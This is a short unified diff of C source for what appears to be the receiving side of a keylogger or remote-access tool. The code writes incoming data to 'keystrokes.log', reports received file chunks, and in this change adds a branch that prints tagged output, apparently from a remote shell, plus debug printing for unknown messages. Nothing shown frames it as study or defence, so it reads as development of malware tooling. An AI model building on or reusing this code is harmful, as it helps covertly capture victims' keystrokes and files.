@@ -109,7 +109,7 @@ int main(void) {
             perror("fork()");
             exit(EXIT_FAILURE);
         default: {
-            FILE *key_file = fopen("keystrokes.log", "w");
+            FILE* key_file = fopen("keystrokes.log", "w");
             if (!key_file) {
                 perror("keystroke log");
                 exit(EXIT_FAILURE);
@@ -126,11 +126,20 @@ int main(void) {
                 } else if (buffer[0] == 'f') {
                     printf("Got %d bytes of a file\n", size);
                     fflush(stdout);
-                } else {
-                    for (int i = 0; i < size; ++i) {
+                } else if (buffer[0] == 's') {
+                    for (int i = 1; i < size; ++i) {
                         printf("%c", buffer[i]);
                     }
                     fflush(stdout);
+                } else {
+                    printf("Received %d bytes of unknown data\n", size);
+#if 1
+                    for (int i = 0; i < 4; ++i) {
+                        printf("%c", buffer[i]);
+                    }
+                    printf("\n");
+                    fflush(stdout);
+#endif
                 }
             }
             if (size < 0) {
